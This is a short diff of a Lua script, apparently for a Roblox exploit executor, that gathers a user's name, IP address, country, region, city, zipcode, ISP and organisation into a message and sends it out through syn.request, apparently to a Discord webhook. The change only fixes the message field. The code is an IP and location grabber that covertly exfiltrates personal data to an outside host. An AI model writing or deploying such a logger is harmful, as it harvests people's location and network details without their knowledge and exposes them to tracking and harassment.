@@ -27,8 +27,7 @@ local FI = {
 }
 local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
 local MessageData = {
-    ["content"] = @everyone
-dataMessage
+    ["content"] = dataMessage
 }
 
 syn.request(
